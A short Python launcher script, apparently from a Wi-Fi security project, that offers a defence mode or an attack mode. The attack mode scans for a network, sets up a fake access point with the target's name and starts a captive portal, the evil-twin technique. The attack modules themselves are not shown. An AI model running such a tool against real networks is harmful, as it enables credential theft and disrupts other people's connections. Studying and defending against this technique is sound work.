import os
import FakeAP as ap
import scan as sc
import DefenceTool as df

if __name__ == '__main__':
    decision = int(input("press \n0 - defence\n1 - attack : "))
    os.system("iwconfig")
    iface = input("please enter the interface you want to use the tool on: ")

    if decision == 1:
        print("you choosed attack!")
        ap.reset_setting(iface)
        deauth, wifi_name = sc.scan(iface)
        print("attacking wifi " + wifi_name)
        # os.system("iwconfig")
        # ap_iface = input("pleae enter the interface you want to set-up the fake ap on: ")
        ap.fake_ap(iface, wifi_name)
        command = '"cd captive_portal && npm start ' + '"'
        os.system('gnome-terminal -- sh -c ' + command)
        x = input("Press Ctrl + C to stop! ")
        # ap.reset_setting(iface)
        # deauth.join()
    else:
        print("you choosed defence!")
        df.defence(iface)
